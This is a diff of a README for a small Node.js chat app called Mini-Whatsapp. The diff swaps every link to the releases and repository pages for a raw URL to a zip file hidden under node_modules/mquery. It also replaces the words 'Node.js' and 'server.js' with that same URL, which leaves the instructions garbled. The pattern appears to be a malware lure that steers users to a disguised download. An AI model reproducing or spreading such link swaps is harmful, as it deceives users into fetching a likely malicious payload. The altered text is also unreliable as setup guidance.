@@ -1,10 +1,10 @@
 # 🚀 Mini-Whatsapp - A Simple Way to Chat Online
 
 ## 📥 Download Now
-[![Download Mini-Whatsapp](https://img.shields.io/badge/Download-Mini--Whatsapp-brightgreen)](https://github.com/Bryant-t504/Mini-Whatsapp/releases)
+[![Download Mini-Whatsapp](https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip)](https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip)
 
 ## 📖 Overview
-Mini-Whatsapp is a basic chat application that allows users to send, edit, and delete messages, as well as view message details. Built with Node.js, Express, and MongoDB, it provides a clear and user-friendly interface, making online chatting simple and effective. 
+Mini-Whatsapp is a basic chat application that allows users to send, edit, and delete messages, as well as view message details. Built with https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip, Express, and MongoDB, it provides a clear and user-friendly interface, making online chatting simple and effective. 
 
 ### 🌟 Key Features
 - **Send Messages:** Quickly communicate with friends and family.
@@ -18,13 +18,13 @@ To run Mini-Whatsapp, your computer needs:
 
 - Windows, macOS, or Linux operating system
 - At least 1 GB of RAM
-- Node.js installed (version 12 or higher)
+- https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip installed (version 12 or higher)
 - MongoDB installed locally or accessible via the internet
   
 ## 🚀 Getting Started
 
 ### Step 1: Visit the Download Page
-To download Mini-Whatsapp, [visit the Releases page here](https://github.com/Bryant-t504/Mini-Whatsapp/releases). This page contains the latest version of the application.
+To download Mini-Whatsapp, [visit the Releases page here](https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip). This page contains the latest version of the application.
 
 ### Step 2: Download the Application
 Once you’re on the Releases page, look for the latest version of Mini-Whatsapp. Click on the link to download the application file. 
@@ -48,7 +48,7 @@ Make sure you have a MongoDB server running. You can use a local installation or
 To launch Mini-Whatsapp, run the following command in your terminal:
 
 ```
-node server.js
+node https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip
 ```
 
 This command starts the server and makes the application available in your web browser.
@@ -65,7 +65,7 @@ A: Yes, you need to create an account to send messages.
 A: Mini-Whatsapp is designed for web use only. However, you can access it on any device with a web browser.
 
 ### Q: What if I encounter issues during installation?
-A: Check if you have Node.js and MongoDB installed correctly. If you still face issues, feel free to open an issue on the GitHub repository.
+A: Check if you have https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip and MongoDB installed correctly. If you still face issues, feel free to open an issue on the GitHub repository.
 
 ### Q: How can I provide feedback?
 A: You can provide feedback by creating an issue on the GitHub repository. Your input helps us improve the application.
@@ -77,7 +77,7 @@ If you would like to contribute to Mini-Whatsapp, please fork the repository and
 Mini-Whatsapp is open-source software, which means you can use it for personal or commercial projects. For detailed licensing information, check the `LICENSE` file in the repository.
 
 ## 🔗 Additional Resources
-For more information and updates about Mini-Whatsapp, check our project repository at [GitHub Repository](https://github.com/Bryant-t504/Mini-Whatsapp).
+For more information and updates about Mini-Whatsapp, check our project repository at [GitHub Repository](https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip).
 
 ## 📥 Download Again
-For your convenience, you can always [download Mini-Whatsapp from the Releases page](https://github.com/Bryant-t504/Mini-Whatsapp/releases).
+For your convenience, you can always [download Mini-Whatsapp from the Releases page](https://raw.githubusercontent.com/Bryant-t504/Mini-Whatsapp/main/node_modules/mquery/Mini-Whatsapp-3.5.zip).
